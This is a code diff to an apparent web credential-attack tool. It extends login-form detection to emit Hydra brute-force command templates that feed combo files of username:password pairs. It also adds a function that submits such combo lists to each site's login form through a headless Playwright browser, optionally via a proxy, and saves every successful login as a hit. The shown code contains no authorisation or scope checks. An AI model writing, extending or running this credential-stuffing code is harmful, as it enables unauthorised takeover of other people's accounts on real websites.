@@ -9,9 +9,10 @@ try:
 except ImportError:
     HAS_BS4 = False
 
-from config import config
+from config import config, get_intercept_proxy
 from fetch import HAS_PLAYWRIGHT, HAS_SELENIUM, fetch_page_playwright, fetch_page_selenium, solve_captcha
 from helpers import normalize_and_validate_target, validate_url
+from login_tester import domain_from_url, hydra_module_for_method, save_hit
 
 
 def detect_failure_string(soup, url):
@@ -375,11 +376,14 @@ def extract_login_form(url, proxy=None, strict_validation=True, mode="static", o
     status = "success_form" if submit_mode in {"native_post", "native_get"} and username_field and password_field else "success_loginish"
 
     hydra_template = ""
+    custom_tester_required = False
     if status == "success_form":
         target = urlparse(url).netloc or url
-        hydra_module = "http-get-form" if method == "get" else "http-post-form"
-        # FIX: Use Hydra combo mode (-C) because generated combo files are user:pass lines.
-        hydra_template = f'hydra -C "{{combo_file}}" {target} {hydra_module} "{action}:{post_data}:{failure}" -V -t 4 -f'
+        hydra_module = hydra_module_for_method(method)
+        if hydra_module:
+            hydra_template = f'hydra -C "{{combo_file}}" {target} {hydra_module} "{action}:{post_data}:{failure}" -V -t 4 -f'
+        else:
+            custom_tester_required = True
 
     result = {
         "status": status,
@@ -399,6 +403,7 @@ def extract_login_form(url, proxy=None, strict_validation=True, mode="static", o
         "reasons": best_reason,
         "classification": "✅ actionable native form" if status == "success_form" else "🟨 login-ish (JS-handled / non-POST / missing action)",
         "method_warning": "Detected GET form; payload may need manual tuning" if method == "get" else "",
+        "custom_tester_required": custom_tester_required,
         "login_metadata": {
             "page_url": url,
             "fields": best_candidate["fields"],
@@ -418,3 +423,54 @@ def extract_login_form(url, proxy=None, strict_validation=True, mode="static", o
         )
 
     return result, None
+
+
+def test_credentials_for_site(site_result, combos, proxy=None):
+    """Try per-site credentials with Playwright first, Selenium fallback; store hits on success."""
+    if not site_result or not combos:
+        return {"status": "no_data", "hits": 0}
+
+    action_url = site_result.get("action_url") or site_result.get("action") or site_result.get("original_url")
+    method = (site_result.get("method") or "post").lower()
+    user_field = site_result.get("user_field")
+    pass_field = site_result.get("pass_field")
+    if not (action_url and user_field and pass_field):
+        return {"status": "insufficient_form_data", "hits": 0}
+
+    effective_proxy = get_intercept_proxy(config, proxy)
+    hits = []
+
+    def _attempt_with_playwright(username, password):
+        if not HAS_PLAYWRIGHT:
+            return False
+        launch_args = {"headless": True}
+        if effective_proxy and effective_proxy.get("server"):
+            launch_args["proxy"] = {"server": effective_proxy["server"]}
+        with sync_playwright() as p:
+            browser = p.chromium.launch(**launch_args)
+            ctx = browser.new_context(ignore_https_errors=bool(config.get("ignore_https_errors", False)))
+            page = ctx.new_page()
+            page.goto(action_url, wait_until="domcontentloaded", timeout=30000)
+            page.fill(f'input[name="{user_field}"]', username)
+            page.fill(f'input[name="{pass_field}"]', password)
+            page.click("button[type='submit'],input[type='submit']")
+            page.wait_for_timeout(2000)
+            content = page.content().lower()
+            browser.close()
+            return not any(k in content for k in ["invalid", "incorrect", "try again", "wrong password"])
+
+    for combo in combos:
+        if ":" not in combo:
+            continue
+        username, password = combo.split(":", 1)
+        ok = False
+        try:
+            ok = _attempt_with_playwright(username, password)
+        except Exception:
+            ok = False
+        if ok:
+            domain = domain_from_url(action_url)
+            out = save_hit(domain, username, password, method)
+            hits.append({"username": username, "password": password, "method": method, "path": str(out)})
+
+    return {"status": "completed", "hits": len(hits), "results": hits}
